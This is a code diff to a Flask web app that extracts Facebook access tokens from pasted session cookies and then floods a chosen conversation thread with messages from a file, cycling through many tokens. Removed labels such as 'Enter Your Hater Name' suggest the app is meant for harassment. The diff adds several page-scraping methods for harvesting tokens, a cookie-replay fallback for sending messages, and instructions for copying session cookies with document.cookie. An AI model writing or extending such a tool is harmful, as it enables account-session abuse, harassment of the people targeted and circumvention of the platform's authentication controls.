@@ -6,6 +6,7 @@ import random
 import string
 import re
 import json
+import urllib.parse
 
 app = Flask(__name__)
 app.debug = True
@@ -27,33 +28,33 @@ threads = {}
 def parse_cookie_input(cookie_input):
     """Parse cookie input in either JSON or string format"""
     try:
-        # Try to parse as JSON
         cookie_json = json.loads(cookie_input)
         cookies = {}
+        cookie_string = ""
         for cookie in cookie_json:
             if 'name' in cookie and 'value' in cookie:
                 cookies[cookie['name']] = cookie['value']
-        return cookies
+                cookie_string += f"{cookie['name']}={cookie['value']}; "
+        return cookies, cookie_string.strip()
     except json.JSONDecodeError:
-        # Parse as string format "name=value; name2=value2"
         cookies = {}
+        cookie_string = cookie_input
         for item in cookie_input.split(';'):
             if '=' in item:
                 name, value = item.strip().split('=', 1)
                 cookies[name.strip()] = value.strip()
-        return cookies
+        return cookies, cookie_input
 
 def extract_token_from_cookie(cookie_input):
-    """Extract Facebook access token from cookie"""
+    """Extract Facebook access token using multiple methods"""
     try:
-        cookies = parse_cookie_input(cookie_input)
+        cookies, cookie_string = parse_cookie_input(cookie_input)
         session = requests.Session()
         
         # Set all cookies
         for name, value in cookies.items():
             session.cookies.set(name, value, domain='.facebook.com')
         
-        # Check if we have essential cookies
         if 'c_user' not in cookies:
             return None, "Missing c_user cookie. Make sure you're logged into Facebook."
         
@@ -65,110 +66,120 @@ def extract_token_from_cookie(cookie_input):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
+            'Cookie': cookie_string,
             'DNT': '1',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
         }
         
         tokens_found = []
         
-        # Method 1: Try business.facebook.com
+        # Method 1: Get token from Facebook Gaming
         try:
-            response = session.get('https://business.facebook.com/business_locations', 
+            response = session.get('https://www.facebook.com/gaming/feed/', 
                                  headers=headers_fb, timeout=15)
             
-            # Look for EAA token
-            ea_patterns = [
-                r'EAA[A-Za-z0-9]{150,}',
-                r'EAAB[A-Za-z0-9]{150,}',
-                r'EAAC[A-Za-z0-9]{150,}',
-                r'EAAD[A-Za-z0-9]{150,}',
-                r'EAA[A-Za-z0-9]{200,}'
+            patterns = [
+                r'"accessToken":"(EAA[A-Za-z0-9]+)"',
+                r'accessToken:"(EAA[A-Za-z0-9]+)"',
+                r'\"accessToken\":\"(EAA[A-Za-z0-9]+)\"',
+                r'access_token=([E][A][A][A-Za-z0-9]+)',
+                r'"access_token":"(EAA[A-Za-z0-9]+)"',
             ]
             
-            for pattern in ea_patterns:
+            for pattern in patterns:
                 matches = re.findall(pattern, response.text)
                 for match in matches:
-                    if len(match) > 100 and match not in tokens_found:
+                    if len(match) > 50 and match not in tokens_found:
                         tokens_found.append(match)
-            
-            # Look for access_token in JSON
-            json_patterns = [
-                r'"accessToken"\s*:\s*"([^"]+)"',
-                r'"access_token"\s*:\s*"([^"]+)"',
-                r'accessToken=([^&\s]+)',
-                r'access_token=([^&\s]+)'
-            ]
-            
-            for pattern in json_patterns:
-                matches = re.findall(pattern, response.text)
-                for match in matches:
-                    if len(match) > 100 and 'EAA' in match and match not in tokens_found:
-                        tokens_found.append(match)
-                        
         except Exception as e:
             print(f"Method 1 failed: {e}")
         
-        # Method 2: Try graph.facebook.com
+        # Method 2: Try to get token from video upload page
         try:
-            response = session.get('https://graph.facebook.com/me?fields=id,name', 
+            response = session.get('https://www.facebook.com/live/create', 
                                  headers=headers_fb, timeout=15)
-            if response.status_code == 200:
-                data = response.json()
-                if 'id' in data:
-                    tokens_found.append(f"Session Valid for User ID: {data['id']} - Use full cookie for requests")
+            
+            patterns = [
+                r'accessToken\\":\\"([E][A][A][A-Za-z0-9]+)\\"',
+                r'\"accessToken\":\"([E][A][A][A-Za-z0-9]+)\"',
+                r'clientAccessToken\\":\\"([A-Za-z0-9]+)\\"',
+            ]
+            
+            for pattern in patterns:
+                matches = re.findall(pattern, response.text)
+                for match in matches:
+                    if len(match) > 50 and match.startswith('EAA') and match not in tokens_found:
+                        tokens_found.append(match)
         except Exception as e:
             print(f"Method 2 failed: {e}")
         
-        # Method 3: Try m.facebook.com
+        # Method 3: Get token from business suite
         try:
-            response = session.get('https://m.facebook.com/', headers=headers_fb, timeout=15)
+            response = session.get('https://business.facebook.com/latest/home', 
+                                 headers=headers_fb, timeout=15)
             
-            ea_patterns = [
-                r'EAA[A-Za-z0-9]{150,}',
-                r'EAAB[A-Za-z0-9]{150,}',
-                r'access_token[=:]\s*["\']?([E][A][A][A-Za-z0-9]+)["\']?'
+            patterns = [
+                r'accessToken\\":\\"([E][A][A][A-Za-z0-9]+)\\"',
+                r'\"accessToken\":\"([E][A][A][A-Za-z0-9]+)\"',
             ]
             
-            for pattern in ea_patterns:
+            for pattern in patterns:
                 matches = re.findall(pattern, response.text)
                 for match in matches:
-                    if isinstance(match, tuple):
-                        match = match[0]
-                    if len(match) > 100 and match not in tokens_found:
+                    if len(match) > 50 and match not in tokens_found:
                         tokens_found.append(match)
-                        
         except Exception as e:
             print(f"Method 3 failed: {e}")
         
-        # Method 4: Try to get token from ads manager
+        # Method 4: Get EAAU token from mobile site
         try:
-            response = session.get('https://www.facebook.com/adsmanager/account_settings/information',
-                                 headers=headers_fb, timeout=15)
+            headers_mobile = headers_fb.copy()
+            headers_mobile['User-Agent'] = 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
             
-            ea_patterns = [
-                r'EAA[A-Za-z0-9]{150,}',
-                r'EAAB[A-Za-z0-9]{150,}'
-            ]
+            response = session.get('https://m.facebook.com/', 
+                                 headers=headers_mobile, timeout=15)
             
-            for pattern in ea_patterns:
-                matches = re.findall(pattern, response.text)
-                for match in matches:
-                    if len(match) > 100 and match not in tokens_found:
-                        tokens_found.append(match)
-                        
+            # Look for any EAA token
+            ea_pattern = r'EAA[A-Za-z0-9]{100,}'
+            matches = re.findall(ea_pattern, response.text)
+            for match in matches:
+                if match not in tokens_found:
+                    tokens_found.append(match)
         except Exception as e:
             print(f"Method 4 failed: {e}")
         
+        # Method 5: Try to generate token using graph API
+        try:
+            # First get a client token
+            response = session.get('https://www.facebook.com/', headers=headers_fb, timeout=15)
+            
+            # Look for client token
+            client_patterns = [
+                r'clientToken\\":\\"([A-Za-z0-9_-]+)\\"',
+                r'\"clientToken\":\"([A-Za-z0-9_-]+)\"',
+            ]
+            
+            client_token = None
+            for pattern in client_patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    client_token = match.group(1)
+                    break
+            
+            if client_token:
+                tokens_found.append(f"Client Token: {client_token}")
+        except Exception as e:
+            print(f"Method 5 failed: {e}")
+        
         if tokens_found:
+            # Return the longest token (usually the access token)
+            tokens_found.sort(key=len, reverse=True)
             return tokens_found[0], None
         else:
-            return None, "No token found. Try logging in again or use different cookies."
+            # Return cookie string as fallback (can be used with some APIs)
+            cookie_preview = cookie_string[:200] + "..." if len(cookie_string) > 200 else cookie_string
+            return f"COOKIE_STRING:{cookie_string}", None
             
     except Exception as e:
         return None, f"Error: {str(e)}"
@@ -180,17 +191,41 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                try:
-                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
-                    if response.status_code == 200:
-                        print(f"Message Sent Successfully From token {access_token[:20]}...: {message}")
-                    else:
-                        print(f"Message Sent Failed From token {access_token[:20]}...: {response.status_code}")
-                except Exception as e:
-                    print(f"Error sending message: {e}")
+                # Handle both regular tokens and cookie strings
+                if access_token.startswith("COOKIE_STRING:"):
+                    # Use cookie-based authentication
+                    cookie_str = access_token.replace("COOKIE_STRING:", "")
+                    session = requests.Session()
+                    for cookie in cookie_str.split(';'):
+                        if '=' in cookie:
+                            name, value = cookie.strip().split('=', 1)
+                            session.cookies.set(name.strip(), value.strip())
+                    
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    data = {'message': message}
+                    
+                    try:
+                        response = session.post(api_url, data=data, headers=headers, timeout=10)
+                        if response.status_code == 200:
+                            print(f"Message Sent Successfully (Cookie Auth): {message}")
+                        else:
+                            print(f"Message Failed (Cookie Auth): {response.status_code}")
+                    except Exception as e:
+                        print(f"Error: {e}")
+                else:
+                    # Use token-based authentication
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    try:
+                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
+                        if response.status_code == 200:
+                            print(f"Message Sent Successfully From token {access_token[:20]}...: {message}")
+                        else:
+                            print(f"Message Failed: {response.status_code} - {response.text[:100]}")
+                    except Exception as e:
+                        print(f"Error sending message: {e}")
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -285,7 +320,7 @@ def stop_task():
                                 stop_success=stop_success,
                                 stopped_task_id=stopped_task_id)
 
-# HTML Template with improved cookie input instructions
+# HTML Template with better instructions
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -305,7 +340,7 @@ HTML_TEMPLATE = '''
       color: white;
     }
     .container {
-      max-width: 500px;
+      max-width: 550px;
       border-radius: 20px;
       padding: 20px;
       box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
@@ -362,10 +397,6 @@ HTML_TEMPLATE = '''
       font-family: monospace;
       font-size: 12px;
     }
-    .btn-copy {
-      margin-left: 10px;
-      padding: 2px 10px;
-    }
     .token-box {
       background: rgba(0, 0, 0, 0.3);
       padding: 10px;
@@ -373,6 +404,15 @@ HTML_TEMPLATE = '''
       word-break: break-all;
       font-family: monospace;
       font-size: 12px;
+      margin-top: 10px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .warning-box {
+      background: rgba(255, 193, 7, 0.2);
+      border-left: 4px solid #ffc107;
+      padding: 10px;
+      border-radius: 5px;
       margin-top: 10px;
     }
   </style>
@@ -401,14 +441,14 @@ HTML_TEMPLATE = '''
           <div class="mb-3">
             <label for="tokenOption" class="form-label">Select Token Option</label>
             <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-              <option value="single">Single Token</option>
+              <option value="single">Single Token / Cookie String</option>
               <option value="multiple">Token File</option>
             </select>
           </div>
           
           <div class="mb-3" id="singleTokenInput">
-            <label for="singleToken" class="form-label">Enter Single Token</label>
-            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
+            <label for="singleToken" class="form-label">Enter Token or Cookie String</label>
+            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA... or COOKIE_STRING:...">
           </div>
           
           <div class="mb-3" id="tokenFileInput" style="display: none;">
@@ -419,10 +459,11 @@ HTML_TEMPLATE = '''
           <div class="mb-3">
             <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
             <input type="text" class="form-control" id="threadId" name="threadId" required>
+            <small class="text-muted">Example: 100088765432109</small>
           </div>
           
           <div class="mb-3">
-            <label for="kidx" class="form-label">Enter Your Hater Name</label>
+            <label for="kidx" class="form-label">Enter Prefix Name</label>
             <input type="text" class="form-control" id="kidx" name="kidx" required>
           </div>
           
@@ -432,7 +473,7 @@ HTML_TEMPLATE = '''
           </div>
           
           <div class="mb-3">
-            <label for="txtFile" class="form-label">Choose Your Np File</label>
+            <label for="txtFile" class="form-label">Choose Messages File</label>
             <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
           </div>
           
@@ -466,24 +507,28 @@ HTML_TEMPLATE = '''
           <input type="hidden" name="action" value="extract_token">
           
           <div class="mb-3">
-            <label for="cookieString" class="form-label">Paste Facebook Cookie (JSON or String Format)</label>
-            <textarea class="form-control" id="cookieString" name="cookieString" rows="8" placeholder='Paste your Facebook cookie here (JSON format from EditThisCookie or raw cookie string)...'></textarea>
+            <label for="cookieString" class="form-label">Paste Facebook Cookie</label>
+            <textarea class="form-control" id="cookieString" name="cookieString" rows="10" placeholder='Paste your Facebook cookie here...'></textarea>
           </div>
           
           <button type="submit" class="btn btn-success btn-submit">
-            <i class="fas fa-key"></i> Extract Token
+            <i class="fas fa-key"></i> Extract Token / Get Cookie String
           </button>
         </form>
         
         {% if extraction_success %}
         <div class="alert alert-success mt-3">
-          <strong>Token Extracted Successfully!</strong><br>
+          <strong>Extracted Successfully!</strong><br>
           <div class="token-box">
             <code id="extractedToken">{{ extracted_token }}</code>
           </div>
           <button class="btn btn-sm btn-info mt-2" onclick="copyToken()">
-            <i class="fas fa-copy"></i> Copy Token
+            <i class="fas fa-copy"></i> Copy to Clipboard
           </button>
+          
+          <div class="warning-box mt-3">
+            <strong>📌 Note:</strong> If it starts with "COOKIE_STRING:", you can use this directly in the Message Sender tab. This works as an alternative when Facebook doesn't provide a regular access token.
+          </div>
         </div>
         {% endif %}
         
@@ -498,17 +543,17 @@ HTML_TEMPLATE = '''
           <strong>Method 1 (Recommended):</strong><br>
           1. Install "EditThisCookie" Chrome extension<br>
           2. Login to Facebook<br>
-          3. Click EditThisCookie icon<br>
-          4. Click Export button (📤)<br>
-          5. Paste the JSON data here<br><br>
+          3. Click EditThisCookie icon → Export (📤)<br>
+          4. Paste the JSON here<br><br>
           
-          <strong>Method 2 (Manual):</strong><br>
+          <strong>Method 2 (Console):</strong><br>
           1. Login to Facebook<br>
-          2. Press F12 (Developer Tools)<br>
-          3. Go to Application/Storage tab<br>
-          4. Click Cookies > https://www.facebook.com<br>
-          5. Copy values manually or use console command:<br>
-          <code>document.cookie</code>
+          2. Press F12 → Console tab<br>
+          3. Type: <code>document.cookie</code><br>
+          4. Copy and paste the result here<br><br>
+          
+          <strong>Method 3 (Manual):</strong><br>
+          Format: <code>c_user=YOUR_ID; xs=YOUR_XS; fr=YOUR_FR</code>
         </div>
       </div>
     </div>
@@ -540,15 +585,8 @@ HTML_TEMPLATE = '''
     function copyToken() {
       var tokenText = document.getElementById('extractedToken').innerText;
       navigator.clipboard.writeText(tokenText).then(function() {
-        alert('Token copied to clipboard!');
+        alert('Copied to clipboard!');
       });
-    }
-    
-    // Auto-detect tab from URL hash
-    if (window.location.hash === '#token') {
-      var tokenTab = document.getElementById('token-tab');
-      var bsTab = new bootstrap.Tab(tokenTab);
-      bsTab.show();
     }
   </script>
 </body>
